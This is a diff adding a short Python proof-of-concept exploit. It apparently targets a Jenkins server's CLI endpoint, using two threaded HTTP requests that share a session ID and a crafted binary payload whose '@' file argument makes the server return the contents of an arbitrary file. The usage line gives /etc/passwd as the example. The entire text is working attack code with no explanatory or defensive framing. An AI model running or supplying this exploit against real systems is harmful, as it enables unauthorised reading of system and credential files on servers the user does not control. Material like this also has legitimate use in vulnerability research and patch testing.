@@ -1,0 +1,42 @@
+import threading
+import http.client
+import time
+import uuid
+import urllib.parse
+import sys
+
+if len(sys.argv) != 3:
+    print('[*] usage: python poc.py http://127.0.0.1:8888/ [/etc/passwd]')
+    exit()
+
+data_bytes = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + sys.argv[2].encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'
+target = urllib.parse.urlparse(sys.argv[1])
+uuid_str = str(uuid.uuid4())
+
+print(f'REQ: {data_bytes}\n')
+
+def req1():
+    conn = http.client.HTTPConnection(target.netloc)
+    conn.request("POST", "/cli?remoting=false", headers={
+        "Session": uuid_str,
+        "Side": "download"
+    })
+    print(f'RESPONSE: {conn.getresponse().read()}')
+
+def req2():
+    conn = http.client.HTTPConnection(target.netloc)
+    conn.request("POST", "/cli?remoting=false", headers={
+        "Session": uuid_str,
+        "Side": "upload",
+        "Content-type": "application/octet-stream"
+    }, body=data_bytes)
+
+t1 = threading.Thread(target=req1)
+t2 = threading.Thread(target=req2)
+
+t1.start()
+time.sleep(0.1)
+t2.start()
+
+t1.join()
+t2.join()
